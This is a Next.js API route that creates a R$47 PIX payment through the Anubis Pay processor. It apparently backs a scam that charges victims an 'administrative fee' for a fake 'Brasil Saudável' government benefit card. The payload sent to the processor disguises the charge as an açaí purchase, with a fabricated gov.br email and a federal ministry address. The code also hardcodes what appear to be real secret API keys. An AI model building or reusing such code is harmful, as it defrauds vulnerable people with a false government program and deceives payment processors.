import { type NextRequest, NextResponse } from "next/server"

interface AnubisPayCustomer {
  name: string
  email: string
  phone: string
  document: {
    type: "cpf"
    number: string
  }
  address: {
    street: string
    streetNumber: string
    complement?: string
    zipCode: string
    neighborhood: string
    city: string
    state: string
    country: "BR"
  }
}

interface AnubisPayItem {
  title: string
  quantity: number
  tangible: boolean
  unitPrice: number
  externalRef: string
}

interface AnubisPayPayload {
  amount: number
  paymentMethod: "pix"
  installments: 1
  customer: AnubisPayCustomer
  items: AnubisPayItem[]
  postbackUrl?: string
  metadata?: string
  externalRef?: string
  ip?: string
}

interface AnubisPayResponse {
  id: number
  amount: number
  paymentMethod: string
  status: string
  pix: {
    qrcode: string
    expirationDate: string
  }
  secureId: string
  createdAt: string
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    const { customer } = body

    if (!customer || !customer.name || !customer.cpf) {
      return NextResponse.json({ error: "Dados do beneficiário não encontrados" }, { status: 400 })
    }

    const documentNumber = customer.cpf.replace(/\D/g, "")
    if (!documentNumber || documentNumber.length !== 11) {
      return NextResponse.json({ error: "CPF inválido" }, { status: 400 })
    }

    const amountInCents = 4700 // R$ 47,00 em centavos

    const payload: AnubisPayPayload = {
      amount: amountInCents,
      paymentMethod: "pix",
      installments: 1,
      customer: {
        name: customer.name,
        email: customer.email || `${documentNumber}@temp.gov.br`,
        phone: customer.phone || "11999999999",
        document: {
          type: "cpf",
          number: documentNumber,
        },
        address: {
          street: "Esplanada dos Ministérios",
          streetNumber: "Bloco A",
          complement: "3º andar",
          zipCode: "70054906",
          neighborhood: "Zona Cívico-Administrativa",
          city: "Brasília",
          state: "DF",
          country: "BR",
        },
      },
      items: [
        {
          title: "Açaí Premium Orgânico - 1kg",
          quantity: 1,
          tangible: true,
          unitPrice: amountInCents,
          externalRef: `acai-premium-${Date.now()}`,
        },
      ],
      metadata: JSON.stringify({ 
        programa: "Brasil Saudável", 
        beneficiario: customer.name,
        cpf: documentNumber,
        tipo: "taxa_administrativa"
      }),
      externalRef: `cartao-brasil-saudavel-${Date.now()}`,
    }

    // Usar as credenciais do Anubis Pay
    const publicKey = "pk_bqXM69MCsRDdV8b4CJbqQkgKQCqQYnRYcaWtrfok4-JDHL9x"
    const secretKey = "sk_2P4IRQfPj_DucDZUpbuFGkHSmXcFUoHz316_8t5r4XzMD_1L"

    const auth = "Basic " + btoa(publicKey + ":" + secretKey)

    const response = await fetch("https://api.anubispay.com.br/v1/transactions", {
      method: "POST",
      headers: {
        Authorization: auth,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })

    if (!response.ok) {
      const errorText = await response.text()
      console.error("Anubis Pay API error:", response.status, errorText)
      return NextResponse.json({ error: "Erro ao gerar PIX. Tente novamente." }, { status: 500 })
    }

    const anubisPayResponse: AnubisPayResponse = await response.json()

    if (!anubisPayResponse.id || !anubisPayResponse.pix || !anubisPayResponse.pix.qrcode) {
      return NextResponse.json({ error: "Erro ao gerar código PIX" }, { status: 500 })
    }

    return NextResponse.json({
      success: true,
      transactionId: anubisPayResponse.secureId || anubisPayResponse.id.toString(),
      pixCode: anubisPayResponse.pix.qrcode,
      expirationDate: anubisPayResponse.pix.expirationDate,
      amount: 47.00,
      status: anubisPayResponse.status
    })

  } catch (error) {
    console.error("Error creating PIX payment:", error)
    return NextResponse.json({ error: "Erro interno do sistema" }, { status: 500 })
  }
}